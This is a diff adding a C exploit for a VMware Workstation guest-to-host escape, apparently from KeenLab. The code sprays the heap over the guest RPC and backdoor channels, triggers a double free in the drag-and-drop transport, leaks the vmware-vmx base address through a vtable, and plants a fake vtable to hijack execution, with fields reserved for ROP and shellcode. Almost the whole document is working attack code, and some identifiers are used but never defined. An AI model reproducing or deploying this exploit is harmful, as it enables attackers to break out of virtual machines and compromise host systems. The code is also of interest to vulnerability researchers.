@@ -1,0 +1,202 @@
+char *initial_dnd = "tools.capability.dnd_version 4";
+static const int cbObj = 0x100;
+char *second_dnd = "tools.capability.dnd_version 2";
+char *chgver = "vmx.capability.dnd_version";
+char *call_transport = "dnd.transport ";
+char *readstring = "ToolsAutoInstallGetParams";
+typedef struct _DnDCPMsgHdrV4
+{
+    char magic[14];
+    char dummy[2];
+    size_t ropper[13];
+    char shellcode[175];
+    char padding[0x80];
+} DnDCPMsgHdrV4;
+
+
+void PrepareLFH()
+{
+    char *result = NULL;
+    char *pObj = malloc(cbObj);
+    memset(pObj, 'A', cbObj);
+    pObj[cbObj - 1] = 0;
+    for (int idx = 0; idx < 1; ++idx) // just occupy 1
+    {
+        char *spary = stringf("info-set guestinfo.k%d %s", idx, pObj);
+        RpcOut_SendOneRaw(spary, strlen(spary), &result, NULL); //alloc one to occupy 4
+    }
+    free(pObj);
+}
+
+size_t infoleak()
+{
+#define MAX_LFH_BLOCK 512
+    Message_Channel *chans[5] = {0};
+    for (int i = 0; i < 5; ++i)
+    {
+        chans[i] = Message_Open(0x49435052);
+        if (chans[i])
+        {
+            Message_SendSize(chans[i], cbObj - 1); //just alloc
+        }
+        else
+        {
+            Message_Close(chans[i - 1]); //keep 1 channel valid
+            chans[i - 1] = 0;
+            break;
+        }
+    }
+    PrepareLFH(); //make sure we have at least 7 hole or open and occupy next LFH block
+    for (int i = 0; i < 5; ++i)
+    {
+        if (chans[i])
+        {
+            Message_Close(chans[i]);
+        }
+    }
+
+    char *result = NULL;
+    char *pObj = malloc(cbObj);
+    memset(pObj, 'A', cbObj);
+    pObj[cbObj - 1] = 0;
+    char *spary2 = stringf("guest.upgrader_send_cmd_line_args %s", pObj);
+    while (1)
+    {
+        for (int i = 0; i < MAX_LFH_BLOCK; ++i)
+        {
+            RpcOut_SendOneRaw(tov4, strlen(tov4), &result, NULL);
+            RpcOut_SendOneRaw(chgver, strlen(chgver), &result, NULL);
+            RpcOut_SendOneRaw(tov2, strlen(tov2), &result, NULL);
+            RpcOut_SendOneRaw(chgver, strlen(chgver), &result, NULL);
+        }
+
+        for (int i = 0; i < MAX_LFH_BLOCK; ++i)
+        {
+            Message_Channel *chan = Message_Open(0x49435052);
+            if (chan == NULL)
+            {
+                puts("Message send error!");
+                Sleep(100);
+            }
+            else
+            {
+                Message_SendSize(chan, cbObj - 1);
+                Message_RawSend(chan, "\xA0\x75", 2); //just ret
+                Message_Close(chan);
+            }
+        }
+        Message_Channel *chan = Message_Open(0x49435052);
+        Message_SendSize(chan, cbObj - 1);
+        Message_RawSend(chan, "\xA0\x74", 2);                                 //free
+        RpcOut_SendOneRaw(dndtransport, strlen(dndtransport), &result, NULL); //trigger double free
+        for (int i = 0; i < min(cbObj-3,MAX_LFH_BLOCK); ++i)
+        {
+            RpcOut_SendOneRaw(spary2, strlen(spary2), &result, NULL);
+            Message_RawSend(chan, "B", 1);
+            RpcOut_SendOneRaw(readstring, strlen(readstring), &result, NULL);
+            if (result[0] == 'A' && result[1] == 'A' && strcmp(result, pObj))
+            {
+               Message_Close(chan); //free the string
+                for (int i = 0; i < MAX_LFH_BLOCK; ++i)
+                {
+                    puts("Trying to leak vtable");
+                    RpcOut_SendOneRaw(tov4, strlen(tov4), &result, NULL);
+                    RpcOut_SendOneRaw(chgver, strlen(chgver), &result, NULL);
+                    RpcOut_SendOneRaw(readstring, strlen(readstring), &result, NULL);
+                    size_t p = 0;
+                    if (result)
+                    {
+                        memcpy(&p, result, min(strlen(result), 8));
+                        printf("Leak content: %p\n", p);
+                    }
+                    size_t low = p & 0xFFFF;
+                    if (low == 0x74A8 || //RpcBase
+                        low == 0x74d0 || //CpV4
+                        low == 0x7630)   //DnDV4
+                    {
+                        printf("vmware-vmx base: %p\n", (p & (~0xFFFF)) - 0x7a0000);
+                        return (p & (~0xFFFF)) - 0x7a0000;
+                    }
+                    RpcOut_SendOneRaw(tov2, strlen(tov2), &result, NULL);
+                    RpcOut_SendOneRaw(chgver, strlen(chgver), &result, NULL);
+                }
+            }
+        }
+        Message_Close(chan);
+    }
+    return 0;
+}
+
+void exploit(size_t base)
+{
+    char *result = NULL;
+    char *uptime_info = stringf("SetGuestInfo -7-%I64u", 0x41414141);
+    char *pObj = malloc(cbObj);
+    memset(pObj, 0, cbObj);
+
+    DnDCPMsgHdrV4 *hdr = malloc(sizeof(DnDCPMsgHdrV4));
+    memset(hdr, 0, sizeof(DnDCPMsgHdrV4));
+    memcpy(hdr->magic, call_transport, strlen(call_transport));
+    while (1)
+    {
+        RpcOut_SendOneRaw(second_dnd, strlen(second_dnd), &result, NULL);
+        RpcOut_SendOneRaw(chgver, strlen(chgver), &result, NULL);
+        for (int i = 0; i < MAX_LFH_BLOCK; ++i)
+        {
+            Message_Channel *chan = Message_Open(0x49435052);
+            Message_SendSize(chan, cbObj - 1);
+            size_t fake_vtable[] = {
+                base + 0xB87340,
+                base + 0xB87340,
+                base + 0xB87340,
+                base + 0xB87340};
+
+            memcpy(pObj, &fake_vtable, sizeof(size_t) * 4);
+
+            Message_RawSend(chan, pObj, sizeof(size_t) * 4);
+            Message_Close(chan);
+        }
+        RpcOut_SendOneRaw(uptime_info, strlen(uptime_info), &result, NULL);
+        RpcOut_SendOneRaw(hdr, sizeof(DnDCPMsgHdrV4), &result, NULL);
+        //check pwn success?
+        RpcOut_SendOneRaw(readstring, strlen(readstring), &result, NULL);
+        if (*(size_t *)result == 0xdeadbeefc0debabe)
+        {
+            puts("VMware escape success! \nPwned by KeenLab, Tencent");
+            RpcOut_SendOneRaw(initial_dnd, strlen(initial_dnd), &result, NULL);//fix dnd to callable prevent vmtoolsd problem
+            RpcOut_SendOneRaw(chgver, strlen(chgver), &result, NULL);
+            return;
+        }
+        //host dndv4 fill in, try to clean up and free again
+        Sleep(100);
+        puts("Object wrong! Retry...");
+        RpcOut_SendOneRaw(initial_dnd, strlen(initial_dnd), &result, NULL);
+        RpcOut_SendOneRaw(chgver, strlen(chgver), &result, NULL);
+    }
+}
+
+int main(int argc, char *argv[])
+{
+    int ret = 1;
+    __try
+    {
+        while (1)
+        {
+            size_t base = 0;
+            do
+            {
+                puts("Leaking...");
+                base = infoleak();
+            } while (!base);
+            puts("Pwning...");
+            exploit(base);
+            break;
+        }
+    }
+    __except (ExceptionIsBackdoor(GetExceptionInformation()) ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
+    {
+        fprintf(stderr, NOT_VMWARE_ERROR);
+        return 1;
+    }
+    return ret;
+}
